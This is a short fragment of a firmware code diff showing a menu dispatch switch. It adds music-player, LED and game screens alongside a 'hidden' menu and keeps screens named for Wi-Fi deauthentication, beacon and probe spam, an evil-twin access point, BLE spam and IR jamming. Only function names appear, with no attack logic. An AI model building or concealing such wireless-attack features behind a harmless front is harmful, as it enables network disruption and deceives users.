-      case S_IR_TVBG: dIrTvbg(); break;
-      case S_DEAUTH: dDeauth(); break;
-      case S_BEACON: dBeacon(); break;
-      case S_PROBE: dProbe(); break;
-      case S_RFMON: dRfMon(); break;
-      case S_EVIL: dEvil(); break;
-      case S_BLE_SCAN: dBleScan(); break;
-      case S_BLE_SPAM: dBleSpam(); break;
-      case S_BLE_IBEACON: dBleIBeacon(); break;
-      case S_SET: dSet(); break;
-      case S_ABOUT: dAbout(); break;
-      case S_OVERHEAT: dOverheat(); break;
+      case S_MAIN:dMain();break;
+      case S_SONGS:dSongs();break;
+      case S_PLAYER:dPlayer();break;
+      case S_BT_MENU:dBtMenu();break;
+      case S_BT_SEARCH:dBtSearch();break;
+      case S_BT_DEV:dBtDev();break;
+      case S_BT_CONN:dBtConn();break;
+      case S_LED_MENU:dLedMenu();break;
+      case S_LED_FX:dLedFx();break;
+      case S_LED_MUS:dLedMus();break;
+      case S_LED_BR:dLedBright();break;
+      case S_LED_WIFI:dLedWifi();break;
+      case S_GAMES:dGames();break;
+      case S_SIMON:dSimon();break;
+      case S_LIGHTS:dLights();break;
+      case S_HIDDEN:dHidden();break;
+      case S_WIFI_H:dWifiH();break;
+      case S_BT_H:dBtH();break;
+      case S_IR_H:dIrH();break;
+      case S_WIFI_SCAN:dWifiScan();break;
+      case S_WIFI_TARGET:dWifiTarget();break;
+      case S_MOCK:dMock();break;
+      case S_IR_LEARN:dIrLearn();break;
+      case S_IR_LIST:dIrList();break;
+      case S_IR_TX:dIrTx();break;
+      case S_IR_JAM:dIrJam();break;
+      case S_IR_TVBG:dIrTvbg();break;
+      case S_DEAUTH:dDeauth();break;
+      case S_BEACON:dBeacon();break;
+      case S_PROBE:dProbe();break;
+      case S_RFMON:dRfMon();break;
+      case S_EVIL:dEvil();break;
+      case S_BLE_SCAN:dBleScan();break;
+      case S_BLE_SPAM:dBleSpam();break;
+      case S_BLE_IBEACON:dBleIBeacon();break;
+      case S_SET:dSet();break;
+      case S_ABOUT:dAbout();break;
+      case S_OVERHEAT:dOverheat();break;
     }
   }
 }
-
-
